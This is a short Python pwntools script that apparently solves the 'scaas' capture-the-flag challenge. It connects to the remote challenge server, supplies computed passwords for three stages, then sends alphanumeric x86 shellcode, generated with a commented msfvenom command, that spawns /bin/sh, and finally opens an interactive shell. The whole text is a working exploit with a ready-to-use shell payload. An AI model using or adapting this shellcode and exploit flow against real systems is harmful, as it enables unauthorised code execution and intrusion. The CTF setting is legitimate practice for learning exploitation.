from pwn import *
#io = process("./scaas",aslr=False)
io = remote("scaas-1.play.hfsc.tf",1337)

def sendPws():
    io.sendlineafter(" >","2")
    # Stage 1 passwords
    io.sendlineafter("Enter password 0:",str(0x916d00))
    io.sendlineafter("Enter password 1:",str(0x707817))
    io.sendlineafter("Enter password 2:",str(0x1337))
    io.sendlineafter("Enter password 3:",str(0x840bc2))
    io.sendlineafter("Enter password 4:",str(0x89228a))
    
    # Stage 2 passwords
    io.sendlineafter("Enter password 0:",str((0x1149 + 501*0x31ef03) / 0x526))
    io.sendlineafter("Enter password 1:",str(0x2f5ac6))
    io.sendlineafter("Enter password 2:",str(0x40169 - 0x1c8))
    io.sendlineafter("Enter password 3:",str(0x40169))
    io.sendlineafter("Enter password 4:",str(0x2b6 + 1))
    
    #for i in range(1000):
    #    if math.ceil((0x1149 + i*0x31ef03) / 0x526) == (0x1149 + i*0x31ef03) / 0x526:
    #            print(i)
    #
    #501
    
    
    
    # Stage 3 passwords
    io.sendlineafter("Enter password 0:",str(1147293932))
    io.sendlineafter("Enter password 1:",str(0x96ac81))
    io.sendlineafter("Enter password 2:",str(0x5fd4d5 + 0xcca + 0x1278))
    io.sendlineafter("Enter password 3:",str(0x5fd4d5))
    io.sendlineafter("Enter password 4:",str(0x5a5))



sendPws()
#msfvenom -a x86 --platform linux -p linux/x86/exec CMD=/bin/sh -e x86/alpha_mixed BufferRegister=EDX
shellcode = b"JJJJJJJJJJJJJJJJJ7RYjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIQztKChJ91BRFu8DmcSK9iwSXDo2ScXs03XToU2BI0nmY9s62zHVhc05PS0fO2BsYrNFO0s2Hs00WbslI9q8MmPAA"
io.sendlineafter("Run SCAAS (alphanumeric shellcode, max 500 bytes):",shellcode)
io.interactive()
